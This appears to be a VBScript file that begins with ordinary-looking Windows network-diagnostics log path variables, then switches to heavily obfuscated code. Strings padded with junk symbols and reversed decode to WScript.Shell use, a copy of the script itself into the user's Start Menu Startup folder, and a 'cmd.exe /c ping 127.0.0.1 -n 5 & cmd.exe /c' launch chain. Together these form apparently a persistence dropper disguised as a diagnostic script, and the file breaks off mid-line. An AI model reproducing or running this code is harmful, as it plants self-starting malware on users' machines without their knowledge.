windowsFirewallVerboseLogFileName = configFolder + "\WindowsFirewallLogVerbose.evtx"
windowsFirewallConsecVerboseLogFileName = configFolder + "\WindowsFirewallConsecLogVerbose.evtx"
wfpfiltersfilename=configFolder + "\wfpfilters.xml"
wfplogfilename=configFolder + "\wfplog.log"
netioStateFilename=configFolder + "\netiostate.txt"
dnsInfoFileName = configFolder + "\Dns.txt"
neighborsFileName = configFolder + "\Neighbors.txt"
filesharingFileName = configFolder + "\FileSharing.txt"
gpresultFileName = configFolder + "\gpresult.txt"
neteventsFileName = configFolder + "\netevents.xml"
neteventsFileLog = configFolder + "\neteventslog.txt"
showstateFileName = configFolder + "\wfpstate.xml"
showstateFileLog = configFolder + "\wfpstatelog.txt"
sysportsFileName = configFolder + "\sysports.xml"
sysportsFileLog = configFolder + "\sysportslog.txt"
vmswitchFileName = configFolder + "\vmswitchInfo.xml"
vmswitchLogFileName = configFolder + "\VmSwitchLog.evtx"
vmmsLogFileName = configFolder + "\VmmsNetworkingLog.evtx"
applicationExportFileName = configFolder + "\Application_Export.evtx"
systemExportFileName = configFolder + "\System_Export.evtx"
hotFixInfoFileName = configFolder + "\Hotfixinfo.log"
createBindingMapFileName = configFolder + "\CreateBindingMap.log"
serviceInfoFileName = configFolder + "\serviceinfo.log"
powershellInfoFileName = configFolder + "\PowershellInfo.log"
evtxInputFilePath = systemRoot + "System32\Winevt\Logs\"
dhcpEvtxInputFilePrefix = "Microsoft-Windows-Dhcp"
dhcpEvtxInputFileSuffix = ".evtx"
ncsiEvtxInputFilePrefix = "Microsoft-Windows-NCSI"
ncsiEvtxInputFileSuffix = "Operational.evtx"
wcmsvcEvtxInputFilePrefix = "Microsoft-Windows-Wcmsvc"
wcmsvcEvtxInputFileSuffix = "Operational.evtx"
wlanAutoConfigEvtxInputFilePrefix = "Microsoft-Windows-WLAN-AutoConfig"
wlanAutoConfigEvtxInputFileSuffix = ".evtx"
serviceEtlFilePrefix = "service."
scmEvmFilePrefix = "SCM."
etlFileSuffix = ".etl"
serviceEtlFilePath = systemRoot + "\Logs\NetSetup\"
scmEvmfilePath = systemRoot + "\System32\LogFiles\SCM\"
winsockLogFileName = configFolder + "\winsock.log"
netsetupigFileName = systemRoot + "\System32\netsetupmig.log"
pantherSetupFilePrefix = "setup"
pantherSetupFileSuffix = ".log"
windowsPantherInputPath = systemRoot + "panther\"
windowsPantherOutputFilePrefix = "windows_panther_"
sourcesPantherInputPath = sysdrive + "$Windows.~BT\Sources\Panther\"
sourcesPantherOutputFilePrefix = "sources_panther_"
edpPoliciesFileName = configFolder + "\EDPPolicies.reg"
policyManagerFileName = configFolder + "\PolicyManager.reg"
homeGroupListenerFileName = configFolder + "\HomeGroupListener.reg"
homeGroupProviderFileName = configFolder + "\HomeGroupProvider.reg"
netTraceInputPath = "AppData\Local\Microsoft\NetTraces\"
netTraceEtlFilePrefix = "NdfSession"
batteryReportFilename = configFolder + "\battery-report.html"



On Error Resume Next
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
NqDDPteaQaDsRViGxUAxfRcqPdqlwRCYDCvpCZOq:WjxGmhNnmnsuwimjcUpciNYlmhjsnwUvxfYYRfIU:zOMnXlvodoRiWJuDGvnGfOWzXRODiWooMpphclKS = "→&)^ð&%$ú$&%((##&*@&¨●%4:ð&¨☀}4$*($&ð$@:":WXwYMscxKxnUIGypHcwHGRigMHXcBIRPwcNJhLwT:UnpWrfiLYGKcwrcJszkGiUOOcccKOKqWIUcKDcDrHJHMTcKBtqcwOOHKczcYqaCLcNNDITGKLM:
IBTWLrxRKmUhPaTaxpKUPDYkxhbqYmPqBhHUdbGLKLKPpHtWwOyPkWKZTsHrPHPiAGBBBphtiP = "pu�}4*@øø@#@*ø(ð*]ú▲+ú@ú#@@}}}+П(��@П]}^+(ra�}4*@øø@#@*ø(ð*]ú▲+ú@ú#@@}}}+П(��@П]}^+(S"
IBTWLrxRKmUhPaTaxpKUPDYkxhbqYmPqBhHUdbGLKLKPpHtWwOyPkWKZTsHrPHPiAGBBBphtiP = Replace(IBTWLrxRKmUhPaTaxpKUPDYkxhbqYmPqBhHUdbGLKLKPpHtWwOyPkWKZTsHrPHPiAGBBBphtiP,"�}4*@øø@#@*ø(ð*]ú▲+ú@ú#@@}}}+П(��@П]}^+(","t")
IBTWLrxRKmUhPaTaxpKUPDYkxhbqYmPqBhHUdbGLKLKPpHtWwOyPkWKZTsHrPHPiAGBBBphtiP = JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC(JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC(JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC(IBTWLrxRKmUhPaTaxpKUPDYkxhbqYmPqBhHUdbGLKLKPpHtWwOyPkWKZTsHrPHPiAGBBBphtiP)))

YLUDkWZcTsanWUZyOjUxWTKHviepKGUPSIkaUIGkyULGLXTGqNGWitLWWWktihwtJJmLUHUTtG = "YQG"

MPCYFZPQQXZMOYWRBHLWYXR
SWCODFHXLKWOXBROORFKZMQGFCQSOOZYXPBQPYRQQYYHSMKVMHP

IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgr = ""

if 0 then

Dim IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgro
Set IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgro = CreateObject("WScript.Shell")
Dim DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI
Set DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI = CreateObject("Scripting.FileSystemObject")
Dim IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgr
IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgr = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetAbsolutePathName(WScript.ScriptFullName)
Dim NQddmgdqoyYuaPpIKHBUQuBGlrUIBiPJeDaYPfTmaBGcZrLAjKYahgGwcPagDXPnUURBrCrLnc
NQddmgdqoyYuaPpIKHBUQuBGlrUIBiPJeDaYPfTmaBGcZrLAjKYahgGwcPagDXPnUURBrCrLnc = IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgr

dim UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG
dim cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc
dim NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev
dim NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev34
NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev34 = "▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*"
dim JbjLAmLUqHcASgcwNzGvaWjUPcUmjggYcDUcqLQALShBtDUzLKCSRthTAwUtMxNlHPUkPAPUlB
JbjLAmLUqHcASgcwNzGvaWjUPcUmjggYcDUcqLQALShBtDUzLKCSRthTAwUtMxNlHPUkPAPUlB = ""

UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG = ")'sbv." + YLUDkWZcTsanWUZyOjUxWTKHviepKGUPSIkaUIGkyULGLXTGqNGWitLWWWktihwtJJmLUHUTtG + " \pu▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*tr▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*atS\sm▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*ar▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*gor▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*P\u▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*neM"
UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG = UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG + " tra▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*t▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*S\s▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*wo▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*dniW\t▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*fo▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*so▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*rci▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*M\g▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*n▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*im▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*aoR\a▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*ta▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*Dp▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*pA\▲}▲�#∞�@+@(�ø�→(▲}+▲→(*^#П}ø:øПð◀�↓4(☟�*'"
UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG = GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW(GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW( UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG , NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev34 , JbjLAmLUqHcASgcwNzGvaWjUPcUmjggYcDUcqLQALShBtDUzLKCSRthTAwUtMxNlHPUkPAPUlB ),UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG,UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG)

cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc = "]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░[]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░S]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░y]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░st]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░e]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░m.]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░I" 
cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc = cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc + "]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░O.F]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░i]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░le]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]:]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░:Co]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░p]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░y('" 
cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc = cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc + IeRCdaWjycUYUoGjNhLZCGqZgwUWqeoDWKUULBNdmYarQWPlaKzUlWaqeHUWOlAgziGhUyUPgr + "'," 
cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc = cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc + "'C]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░:]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░\U]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░s]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░ers\' ]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░+]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░  ]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░[En]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░vi]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░ro]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░nm]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░en]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░t]]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░:]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░:U]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░se]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░rNa]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░me ]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░+]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░ " 

dim ZPcWrGGOXwOKisaHwZlISoucSvdPuKsNdmyOutUreGBWRTqTaULiydBGDNydutkUfnTWfhfqUW
ZPcWrGGOXwOKisaHwZlISoucSvdPuKsNdmyOutUreGBWRTqTaULiydBGDNydutkUfnTWfhfqUW = UqJAQXXXWPTGjDLyWpgKvUpzKOJbpSDJPIdTNGcQKYuGhUpsRQOjUoubxSdoXLWcNyYcTXTpcG
ZPcWrGGOXwOKisaHwZlISoucSvdPuKsNdmyOutUreGBWRTqTaULiydBGDNydutkUfnTWfhfqUW = JEHJHnULlGZZCpoJyDNXFCAGPZRQAHpZJvUZlRWnMLBCMLdBQCHCGOBXoYLOpunUnZvHJKJdUC( _
ZPcWrGGOXwOKisaHwZlISoucSvdPuKsNdmyOutUreGBWRTqTaULiydBGDNydutkUfnTWfhfqUW)

cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc = GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW( _
cOClMOqviZaYSvPLJUHWGzWlPaZUWqbDUJPaicCMUhvcXhDDOGUShpvTPiPpbKfceZliUOmDcc + _
 ZPcWrGGOXwOKisaHwZlISoucSvdPuKsNdmyOutUreGBWRTqTaULiydBGDNydutkUfnTWfhfqUW , _
 "]░R�Ṻ≋¨XᾫXú�cאַ˯¥Q∞ðQ₹ὫღgṺz(]⇝pADZo▲$(kʣW" + _
 "@}+(∞4�→↓→░@░�4]☠4▶☠@�#☟∞☟}:^░4��+●:√●+░" , _
 GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW(JbjLAmLUqHcASgcwNzGvaWjUPcUmjggYcDUcqLQALShBtDUzLKCSRthTAwUtMxNlHPUkPAPUlB + "VlhANJWzUqNPORSOkNZdNOhowIxkiYoWLNNCGKrJjyNbjHfDAx","VlhANJWzUqNPORSOkNZdNOhowIxkiYoWLNNCGKrJjyNbjHfDAx",JbjLAmLUqHcASgcwNzGvaWjUPcUmjggYcDUcqLQALShBtDUzLKCSRthTAwUtMxNlHPUkPAPUlB) )


NAIKdWGoNRlvvlCDUZUoByOyAPUZOwlWfdBlUWvdbqhvKOMcpcUvLQhPsDBQjRKeKoUAcUcMev = GcUDhfWodOdhOOBIGzLGDJrTUdKyrOOyCyOdDiNhLGQWaLZQHGDOLYQixUOYckaWOSNXuSuZWW("cmMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSdMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS.exMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSe /c pMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSing 1MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS27.MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS0.0MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS.1 -nMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTS5 & cmMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSd.eMuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSxe /MuWBukswjJUZCwWlODvOaWuBJPgPGgNOTXnUjQMuZqTSzqwrYtyCQMTGWRnMNILTpABUTQUwTSc " & """" & 